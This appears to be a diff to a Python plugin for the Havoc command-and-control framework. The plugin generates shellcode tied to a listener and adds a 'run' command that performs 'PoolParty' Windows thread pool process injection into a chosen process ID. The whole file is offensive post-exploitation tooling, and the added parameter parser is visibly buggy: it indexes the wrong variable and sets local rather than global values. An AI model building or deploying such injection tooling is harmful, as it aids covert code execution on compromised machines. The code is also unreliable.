@@ -12,6 +12,8 @@ from time import sleep
 cwd = "/home/cipher/Github/havoc-PoolParty"
 shellcode_file_path = cwd + "/payload.bin"
 poolparty_file_path = cwd + "/PoolParty.exe"
+variant = "8"
+pid = ""
 
 def generate_payload(demon, arch, listener):
 	if os.path.exists(shellcode_file_path):
@@ -59,7 +61,7 @@ def generate(demonID, *params):
 
 	if num_params != 4 or params[0] == 'help' or params[0] == '-h':
 		demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
-		demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a {x86/x64} -l {listener name}")
+		demon.ConsoleWrite(demon.CONSOLE_INFO, "		poolparty generate -a {x86/x64} -l {listener name}\n")
 		demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
 		if len(listeners) == 0:
 			demon.ConsoleWrite(demon.CONSOLE_ERROR, "No Listeners Running!!!")
@@ -99,5 +101,57 @@ def save_shellcode(data):
 	file.close()
 	os.system(f"python3 {cwd}/generate.py -f {shellcode_file_path} ")
 
+def run_parse_params(demon, params):
+	num_params = len(params)
+
+	skip = False
+
+	for i in range(num_params):
+		if skip:
+			skip = False
+			continue
+
+		param = params[i]
+
+		if param == '-V' or param == '-v':
+			skip = True
+			if i+1 >= num_params:
+				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing variant value (-v {1/2/3/4/5/6/7/8})" )
+				return False
+			variant = param[i+1]
+
+		elif param == '-P' or param == '-p':
+			skip = True
+			if i+1 >= num_params:
+				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing PID (-P {PID})" )
+				return False
+			pid = param[i+1]
+
+		elif param == '-h' or param == "help":
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"\n")
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"VARIANT \t\t\t\t DESCRIPTION     ")
+
+		else:
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+
+	return True
+
+def run(demonID, *params):
+	TaskID : str = None
+	demon : Demon = None
+	demon = Demon(demonID)
+
+	if not os.path.exists(poolparty_file_path):
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please generate the PoolParty payload first!")
+		return False
+
+	
+	TaskID = run_parse_params(demon, params)
+
+	return TaskID
+
+
 RegisterModule("poolparty", "Windows Thread Pool Injection Module", "", "", "", "")
 RegisterCommand(generate, "poolparty", "generate", "Generate the PoolParty executable",0, "", "")
+RegisterCommand(run, "poolparty", "run", "Run the PoolParty process injection", 0, "", "")
